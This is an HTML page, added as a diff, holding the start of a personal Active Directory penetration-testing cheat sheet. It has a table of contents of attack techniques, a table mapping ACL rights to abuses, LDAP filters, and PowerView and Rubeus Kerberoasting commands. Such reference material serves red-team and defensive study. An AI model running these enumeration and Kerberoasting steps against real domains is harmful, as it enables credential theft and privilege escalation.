@@ -1,0 +1,1128 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this arsenals for any extra commands (Ctrl+f will definitely help)"><title>🪴 AD CheatSheet</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://quartz.jzhao.xyz//icon.png><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Source+Sans+Pro:wght@400;600;700&family=Fira+Code:wght@400;700&display=swap" rel=stylesheet><link href=https://quartz.jzhao.xyz/styles.ed856e6cefcc239cf093f5723dade2c8.min.css rel=stylesheet><link href=https://quartz.jzhao.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://quartz.jzhao.xyz/js/darkmode.63d6a3e095d0bd2b935b62adec9dc11b.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://quartz.jzhao.xyz/js/popover.f540962245558fc2f94140c7c0975075.min.js></script>
+<script src=https://quartz.jzhao.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://quartz.jzhao.xyz/js/clipboard.25155053855f45fdc48fd92540bcebc9.min.js></script>
+<script>const BASE_URL="https://quartz.jzhao.xyz/",fetchData=Promise.all([fetch("https://quartz.jzhao.xyz/indices/linkIndex.0a11fc289b395aa909da71ad18a641e1.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://quartz.jzhao.xyz/indices/contentIndex.70a5a23a6cc16452d0ea1e60bef4d96d.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const n=new URL(BASE_URL),s=n.pathname,o=window.location.pathname,i=s==o;addCopyButtons(),addTitleToCodeBlocks();const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=i&&!1;drawGraph("https://quartz.jzhao.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2}),initPopover("https://quartz.jzhao.xyz",!0,!0)},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/quartz.jzhao.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://quartz.jzhao.xyz/js/search.cf33b507388f3dfd5513a2afcda7af41.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://quartz.jzhao.xyz/>🪴 Quartz 3.2</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>🪴 AD CheatSheet</h1><p class=meta>Last updated July 14, 2022.</p><ul class=tags></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#domain-enumeration>Domain Enumeration</a><ol><li><a href=#forest-trust>Forest Trust</a></li><li><a href=#asrep-roasting>ASREP Roasting</a></li><li><a href=#kerberoasting>Kerberoasting</a></li><li><a href=#unconstrained--constrained-object>Unconstrained / Constrained Object</a></li></ol></li><li><a href=#constrained-language-mode-clm--wdac--device-guard>Constrained Language Mode (CLM) / WDAC / Device Guard</a><ol><li><a href=#clm-enumeration>CLM Enumeration</a></li><li><a href=#view-applocker-rules>View AppLocker Rules</a></li><li><a href=#dump-lsass-process-with-signed-binary>Dump lsass process with signed binary</a></li></ol></li></ol><ol><li><a href=#unconstrained-delegation>Unconstrained Delegation</a><ol><li><a href=#printer-bug>Printer Bug</a></li><li><a href=#extract-tgt>Extract TGT</a></li></ol></li><li><a href=#constrained-delegation>Constrained Delegation</a><ol><li><a href=#s4u-delegation>s4u delegation</a></li></ol></li><li><a href=#resource-based-constrained-delegation>Resource-Based Constrained Delegation</a><ol><li></li></ol></li></ol><ol><li><ol><li><a href=#force-change-user-password>Force Change User Password</a></li><li><a href=#change-password-with-credential>Change password with credential</a></li><li><a href=#add-users-to-group>Add Users to Group</a></li><li><a href=#targeted-kerberoast>Targeted Kerberoast</a></li><li><a href=#overwrite-logon-script>Overwrite Logon Script</a></li><li><a href=#add-dcsync-privilege-to-object>Add DCSync Privilege to object</a></li><li><a href=#read-laps-local-administrator-password>Read LAPS Local Administrator Password</a></li></ol></li></ol><ol><li><ol><li><a href=#enumerate-weak-gpo-permission>Enumerate weak GPO Permission</a></li><li><a href=#gpo-abuse-with-powerview>GPO Abuse with PowerView</a></li></ol></li></ol><ol><li><ol><li><a href=#get-sql-instances>Get SQL Instances</a></li><li><a href=#get-sql-linked-server>Get SQL Linked Server</a></li><li><a href=#execute-remote-sqlquery>Execute Remote SQLQuery</a></li></ol></li></ol><ol><li><ol><li><a href=#child-parent-domain-escalation>Child-Parent Domain Escalation</a></li></ol></li></ol><ol><li><ol><li><a href=#sid-history>SID History</a></li><li><a href=#shadow-principalpam-trust>Shadow Principal/PAM Trust</a></li><li><a href=#foreign-principal>Foreign Principal</a></li><li><a href=#trust-account>Trust Account</a></li></ol></li></ol><ol><li><ol><li><a href=#overpass-the-hash-opth>Overpass-The-Hash (OPTH)</a></li><li><a href=#request-tgt>Request TGT</a></li><li><a href=#runas>runas</a></li><li><a href=#ntlm-relay>NTLM Relay</a></li><li><a href=#credential-harvesting>Credential Harvesting</a></li><li><a href=#dcsync>DCSync</a></li></ol></li></ol><ol><li><ol><li><a href=#golden-ticket>Golden Ticket</a></li><li><a href=#diamond-ticket>Diamond Ticket</a></li><li><a href=#msds-allowedtodelegateto>msDS-AllowedToDelegateTo</a></li><li><a href=#registry-keys>Registry Keys</a></li><li><a href=#execute-on-startup>Execute on startup</a></li><li><a href=#krbtgt-constrained-delegation>krbtgt Constrained Delegation</a></li></ol></li></ol><ol><li><ol><li><a href=#ps-remoting>PS Remoting</a></li><li><a href=#winrs>Winrs</a></li><li><a href=#smb>SMB</a></li><li><a href=#wmi>WMI</a></li><li><a href=#dcom>DCOM</a></li><li><a href=#reference>Reference</a></li></ol></li></ol><ol><li><ol><li><a href=#cobalt-strike-beacon>Cobalt Strike Beacon</a></li><li><a href=#covenant-grunt>Covenant Grunt</a></li></ol></li></ol><ol><li><ol><li><a href=#zerologon>ZeroLogon</a></li><li><a href=#hivenightmare>HiveNightmare</a></li></ol></li></ol><ol><li><ol><li><a href=#automated-exploit>Automated Exploit</a></li><li><a href=#reference-1>Reference</a></li></ol></li></ol><ol><li><ol><li><a href=#pki-abuse>PKI Abuse</a></li><li><a href=#esc1>ESC1</a></li><li><a href=#esc4>ESC4</a></li><li><a href=#esc8>ESC8</a></li><li><a href=#certifried>Certifried</a></li></ol></li><li><a href=#relay-notes>Relay Notes</a></li></ol><ol><li><ol><li><a href=#php-reverse-shell>php reverse shell</a></li><li><a href=#perl-reverse-shell>perl reverse shell</a></li><li><a href=#nodejs-reverse-shell>nodejs reverse shell</a></li><li><a href=#c-reverse-shell>c reverse shell</a></li><li><a href=#c-reverse-shell-1>c# reverse shell</a></li><li><a href=#jenkins-reverse-shell>jenkins reverse shell</a></li><li><a href=#lua-reverse-shell>lua reverse shell</a></li><li><a href=#jsp-reverse-shell>jsp reverse shell</a></li></ol></li></ol></nav></details></aside><p>This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this
+<a rel=noopener class="internal-link broken" data-src=arsenals>arsenals</a> for any extra commands (<code>Ctrl+f</code> will definitely help)</p><p><strong><em>Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk</em></strong></p><ul><li><strong><a rel=noopener class="internal-link broken" data-src=#acls-possible-abuse>ACLs/ACEs permissions</a></strong></li><li><strong><a rel=noopener class="internal-link broken" data-src=#ldap-filters>LDAP Filters as alternative</a></strong></li><li><strong><a rel=noopener class="internal-link broken" data-src=#situational-awaress>Situational Awareness</a></strong><ul><li><strong><a rel=noopener class="internal-link broken" data-src=#domain-enumeration>Domain Enumeration</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#forest-trust>Forest Trust</a></li><li><a rel=noopener class="internal-link broken" data-src=#asrep-roasting>ASREP Roasting</a></li><li><a rel=noopener class="internal-link broken" data-src=#kerberoasting>Kerberoasting</a></li><li><a rel=noopener class="internal-link broken" data-src=#unconstrained--constrained-object>Unconstrained / Constrained Object</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#constrained-language-mode>Constrained Language Mode</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#clm-enumeration>CLM Enumeration</a></li><li><a rel=noopener class="internal-link broken" data-src=#dump-lsass-process-with-signed-binary>Dump lsass with rundll32</a></li></ul></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#delegations>Delegations</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#unconstrained-delegation>Unconstrained Delegation</a><ul><li><a rel=noopener class="internal-link broken" data-src=#printer-bug>Printer Bug</a></li><li><a rel=noopener class="internal-link broken" data-src=#extract-tgt>Extract TGTs</a></li></ul></li><li><a rel=noopener class="internal-link broken" data-src=#constrained-delegation>Constrained Delegation</a><ul><li><a rel=noopener class="internal-link broken" data-src=#s4u-delegation>s4u Delegation</a></li></ul></li><li><a rel=noopener class="internal-link broken" data-src=#resource-based-constrained-delegation>Resource-Based Constrained Delegation</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#acls/aces-abuse>ACLs/ACEs Abuse</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#force-change-user-password>ForceChangeUserPassword</a></li><li><a rel=noopener class="internal-link broken" data-src=#change-password-with-credential>Change Password (with PSCredential</a></li><li><a rel=noopener class="internal-link broken" data-src=#targeted-kerberoast>Targeted Kerberoast</a></li><li><a rel=noopener class="internal-link broken" data-src=#add-dcsync-to-object>Add DCsync privilege to object</a></li><li><a rel=noopener class="internal-link broken" data-src=#add-users-to-group>Add Users to Group</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#weak-gpo-permission>Weak GPO Permission</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#enumerate-weak-gpo-permission>Enumerate weak GPO Permission</a></li><li><a rel=noopener class="internal-link broken" data-src=#gpo-abuse-with-powerview>GPO Abuse with PowerView</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#sql-server-enumeration-and-code-execution>SQL Server Enumeration and Code Execution (PowerUpSQL)</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#get-sql-instances>Get SQL Instances</a></li><li><a rel=noopener class="internal-link broken" data-src=#get-sql-linked-server>Get SQL Linked Server</a></li><li><a rel=noopener class="internal-link broken" data-src=#execute-sql-query-and-os-command>Execute SQL Query and OS Command</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#domain-trust-hopping>Domain Trust Hopping</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#child-parent-domain-escalation>Child-Parent Domain Escalation</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#forest-trust-hopping>Forest Trust Hopping</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#sid-history>SID History</a></li><li><a rel=noopener class="internal-link broken" data-src=#shadow-principal>Shadow Principal</a></li><li><a rel=noopener class="internal-link broken" data-src=#foreign-principal>Foreign Principal</a></li><li><a rel=noopener class="internal-link broken" data-src=#trust-account>Trust Account</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#lateral-movement--post-exploitation>Lateral Movement / Post Exploitation</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#overpass-the-hash-opth>Overpass-The-Hash</a></li><li><a rel=noopener class="internal-link broken" data-src=#request-tgt>Request TGT</a></li><li><a rel=noopener class="internal-link broken" data-src=#runas>runas</a></li><li><a rel=noopener class="internal-link broken" data-src=#ntlm-relay>NTLM Relay</a></li><li><a rel=noopener class="internal-link broken" data-src=#credential-harvesting>Credential Harvesing</a><ul><li><a rel=noopener class="internal-link broken" data-src=#dcsync>DCSync</a></li></ul></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#persistence>Persistence</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#golden-ticket>Golden Ticket</a></li><li><a rel=noopener class="internal-link broken" data-src=#diamond-ticket>Diamond Ticket</a></li><li>Skeleton Keys</li><li>Shortcuts</li><li><a rel=noopener class="internal-link broken" data-src=#msds-allowedtodelegateto>msDS-AllowedToDelegateTo</a></li><li>Scheduled Tasks</li><li>AdminSDHolder</li><li><a rel=noopener class="internal-link broken" data-src=#registry-keys>Registry Keys</a><ul><li><a rel=noopener class="internal-link broken" data-src=#execute-on-startup>Execute on startup</a></li><li>Recycle Bin</li></ul></li><li><a rel=noopener class="internal-link broken" data-src=#krbtgt-constrained-delegation>krbtgt Constrained Delegation</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#remote-authentication-protocol>Remote Access</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#ps-remoting>PSRemoting</a></li><li><a rel=noopener class="internal-link broken" data-src=#winrs>Winrs</a></li><li><a rel=noopener class="internal-link broken" data-src=#psexec>PsExec</a></li><li><a rel=noopener class="internal-link broken" data-src=#wmi>WMI</a></li><li><a rel=noopener class="internal-link broken" data-src=#dcom>DCOM</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#generate-vbscript-dropper-apc-process-injection>Generate VBScript dropper (APC process injection)</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#cobalt-strike-beacon>Cobalt Strike Beacon</a></li><li><a rel=noopener class="internal-link broken" data-src=#convenant-grunt>Covenant Grunt</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#low-hanging-fruits>Low Hanging Fruits</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#zerologon>ZeroLogon</a></li><li><a rel=noopener class="internal-link broken" data-src=#hivenightmare>HiveNightmare</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#printnightmare>PrintNightmare</a></strong></li><li><strong><a rel=noopener class="internal-link broken" data-src=#nopac>noPac</a></strong></li><li><strong><a rel=noopener class="internal-link broken" data-src=#ADCS>Active Directory Certificate Service</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#pki-abuse>PKI Abuse</a></li><li><a rel=noopener class="internal-link broken" data-src=#esc1>ESC1</a></li><li><a rel=noopener class="internal-link broken" data-src=#esc4>ESC4</a></li><li><a rel=noopener class="internal-link broken" data-src=#esc8>ESC8</a></li><li><a rel=noopener class="internal-link broken" data-src=#certifried>Certifried</a></li></ul></li><li><strong><a rel=noopener class="internal-link broken" data-src=#relay-notes>Relay Notes</a></strong></li><li><strong><a rel=noopener class="internal-link broken" data-src=#file-transfer>File Transfer</a></strong></li><li><strong><a rel=noopener class="internal-link broken" data-src=#reverse-shells>Reverse Shells</a></strong><ul><li><a rel=noopener class="internal-link broken" data-src=#php-reverse-shell>php</a></li><li><a rel=noopener class="internal-link broken" data-src=#perl-reverse-shell>perl</a></li><li><a rel=noopener class="internal-link broken" data-src=#nodejs-reverse-shell>nodejs</a></li><li><a rel=noopener class="internal-link broken" data-src=#c-reverse-shell>c</a></li><li><a rel=noopener class="internal-link broken" data-src=#c-sharp-reverse-shell>c#</a></li><li><a rel=noopener class="internal-link broken" data-src=#jenkins-reverse-shell>jenkins</a></li><li><a rel=noopener class="internal-link broken" data-src=#lua-reverse-shell>lua</a></li><li><a rel=noopener class="internal-link broken" data-src=#jsp-reverse-shell>jsp</a></li></ul></li></ul><a href=#acls-possible-abuse><h1 id=acls-possible-abuse><span class=hanchor arialabel=Anchor># </span>ACLs possible abuse</h1></a><table><thead><tr><th>ACL/ACE</th><th>Object</th><th>Permission</th><th>Abuse</th><th>ScreenShot</th></tr></thead><tbody><tr><td><strong>GenericAll</strong></td><td>User</td><td>Full rights</td><td><a rel=noopener class="internal-link broken" data-src=#force-change-user-password>Force change user&rsquo;s password</a>,
+<a rel=noopener class="internal-link broken" data-src=#targeted-kerberoast>Targeted Kerberoast</a>, Shadow Credentials</td><td><img src=https://quartz.jzhao.xyz//./images/ad/GenericAll_user.PNG width=auto alt></td></tr><tr><td><strong>GenericAll</strong></td><td>Group</td><td>Full rights</td><td><a rel=noopener class="internal-link broken" data-src=#add-users-to-group>Self add to group</a></td><td><img src=https://quartz.jzhao.xyz//./src/images/GenericAll_Group.PNG width=auto alt></td></tr><tr><td><strong>GenericAll</strong></td><td>Computer</td><td>Full rights</td><td><a rel=noopener class="internal-link broken" data-src=#resource-based-contrained-delegation>RBCD</a></td><td><img src=https://quartz.jzhao.xyz//./images/ad/GenericAll_Computer.PNG width=auto alt></td></tr><tr><td><strong>GenericWrite</br>WriteProperty</strong></td><td>User</td><td>Write/update object&rsquo;s attributes</td><td><a rel=noopener class="internal-link broken" data-src=#targeted-kerberoast>Targeted Kerberoast</a>,
+<a rel=noopener class="internal-link broken" data-src=#overwrite-logon-script>Overwrite Logon Script</a></td><td><img src=https://quartz.jzhao.xyz//./images/ad/GenericWrite.PNG width=auto alt></td></tr><tr><td><strong>GenericWrite</strong></td><td>Group</td><td>ability to self add to group</td><td><a rel=noopener class="internal-link broken" data-src=#add-users-to-group>Self add to group</a></td><td><img src=https://quartz.jzhao.xyz//./images/ad/GenericWrite_Group.PNG width=auto alt></td></tr><tr><td><strong>GenericWrite</br>WriteProperty</strong></td><td>Computer</td><td>Write/update object&rsquo;s attributes</td><td><a rel=noopener class="internal-link broken" data-src=#resource-based-constrained-delegation>RBCD</a></td><td></td></tr><tr><td><strong>GenericWrite</br>AllExtendedWrite</br>GenericAll</br>WriteOwner</br>WriteProperty</strong></td><td>GPO</td><td>Write object&rsquo;s properties</td><td><a rel=noopener class="internal-link broken" data-src=#gpo-abuse-with-powerview>Add self to local admin</a></td><td></td></tr><tr><td><strong>WriteDACL</strong></td><td>Domain</td><td>modify object&rsquo;s ACE (full control)</td><td><a rel=noopener class="internal-link broken" data-src=#add-dcsync-to-object>Give owned users DCsync Privilege</a></td><td></td></tr><tr><td><strong>WriteOwner</strong></td><td>User</td><td>change owner/password</td><td><a rel=noopener class="internal-link broken" data-src=#change-password-with-credential>Change user&rsquo;s password with credential</a></td><td></td></tr><tr><td><strong>Self-Membership/Self</strong></td><td>Group</td><td>ability to add ourself to the group</td><td><a rel=noopener class="internal-link broken" data-src=#add-users-to-group>Self add to group</a></td><td></td></tr><tr><td><strong>ExtendedRights</strong></td><td>User</td><td>change user&rsquo;s password</td><td><a rel=noopener class="internal-link broken" data-src=#force-change-user-password>Force change user&rsquo;s password</a></td><td><img src=https://quartz.jzhao.xyz//./images/ad/AllExtendedRights.PNG width=auto alt></td></tr><tr><td><strong>ExtendedRights</strong></td><td>Group</td><td>Read LAPS Password</td><td><a rel=noopener class="internal-link broken" data-src=#read-laps-local-administrator-password>Read LAPS Password</a></td><td></td></tr><tr><td><strong>User-Force-Change-Password</strong></td><td>User</td><td>change user&rsquo;s password</td><td><a rel=noopener class="internal-link broken" data-src=#force-change-user-password>Force change user&rsquo;s password</a></td><td><img src=https://quartz.jzhao.xyz//./images/ad/Force-Change-User-Password.PNG width=auto alt></td></tr></tbody></table><a href=#ldap-filters><h1 id=ldap-filters><span class=hanchor arialabel=Anchor># </span>LDAP Filters</h1></a><table><thead><tr><th>PowerView</th><th>Description</th><th>LDAP Filter</th></tr></thead><tbody><tr><td><code>Get-DomainController</code></td><td>Get current domain controller</td><td><code>(userAccountControl:1.2.840.113556.1.4.803:=8192)</code></td></tr><tr><td><code>Get-Forest</code></td><td>Get current forest</td><td><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code></td></tr><tr><td><code>Get-DomainUser</code></td><td>Get all domain users</td><td><code>(&(samAccountType=805306368))</code></td></tr><tr><td><code>Get-DomainUser -TrustedToAuth</code></td><td>Get trusted users for delegation</td><td><code>(&(samAccountType=805306368)(msds-allowedtodelegateto=*))</code></td></tr><tr><td><code>Get-DomainUser -SPN</code></td><td>Get non-null users&rsquo; SPN</td><td><code>(&(samAccountType=805306368)(servicePrincipalName=*))</code></td></tr><tr><td><code>Get-DomainUser -PreAuthNotRequired</code></td><td>Get users that disable preauth</td><td><code>(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code></td></tr><tr><td><code>Get-DomainGroup</code></td><td>Get all domain groups</td><td><code>(&(objectCategory=group))</code></td></tr><tr><td><code>Get-DomainGroup *admin*</code></td><td>Get specific domain group identity</td><td><code>(&(samAccountType>(&(samAccountType=805306368)(|(samAccountName=<em>admin</em>)))</code></td></tr><tr><td><code>Get-DomainComputer</code></td><td>Get all domain computers</td><td><code>(&(samAccountType=805306369))</code></td></tr><tr><td><code>Get-DomainComputer -Unconstrained</code></td><td>Get all unconstrained domain computers</td><td><code>(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</code></td></tr><tr><td><code>Get-DomainGPO</code></td><td>Get all domain GPO</td><td><code>(&(objectCategory=groupPolicyContainer))</code></td></tr></tbody></table><p>Example use:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Current domain context
+</span></span><span class=line><span class=cl>([adsisearcher]&#34;&lt;ldap-filter&gt;&#34;).FindAll()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Other domain context
+</span></span><span class=line><span class=cl>$adsiSearcherObj = [adsisearcher]&#34;&#34;
+</span></span><span class=line><span class=cl>$adsiSearcherObj.SearchRoot = [ADSI]&#34;LDAP://DC01/DC=legitcorp,DC=local&#34;
+</span></span><span class=line><span class=cl>$adsiSearcherObj.Filter = &#34;&lt;ldap-filter&gt;&#34;
+</span></span><span class=line><span class=cl>$adsiSearcherObj.FindAll()
+</span></span></code></pre></td></tr></table></div></div><p><em>Note: These LDAP filters can be used with <code>[adsisearcher]</code> builtin function in powershell. Any extra commands can be found
+<a href=https://mlcsec.com/active-directory-domain-enumeration-part-2 rel=noopener>here</a>. Amazing cheatsheet by
+<a href=https://twitter.com/mlcsec rel=noopener>@mlcsec</a></em></p><a href=#situational-awareness><h1 id=situational-awareness><span class=hanchor arialabel=Anchor># </span>Situational Awareness</h1></a><a href=#domain-enumeration><h2 id=domain-enumeration><span class=hanchor arialabel=Anchor># </span>Domain Enumeration</h2></a><a href=#forest-trust><h3 id=forest-trust><span class=hanchor arialabel=Anchor># </span>Forest Trust</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Map all domain trusts
+</span></span><span class=line><span class=cl>Get-DomainTrustMapping -Verbose
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Get Forest Trust from current domain
+</span></span><span class=line><span class=cl>Get-DomainTrust
+</span></span></code></pre></td></tr></table></div></div><a href=#asrep-roasting><h3 id=asrep-roasting><span class=hanchor arialabel=Anchor># </span>ASREP Roasting</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Get-DomainUser -PreauthNotRequired
+</span></span></code></pre></td></tr></table></div></div><a href=#kerberoasting><h3 id=kerberoasting><span class=hanchor arialabel=Anchor># </span>Kerberoasting</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Powerview
+</span></span><span class=line><span class=cl>Get-DomainUser -SPN
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Rubeus
+</span></span><span class=line><span class=cl>Rubeus.exe kerberoast /nowrap
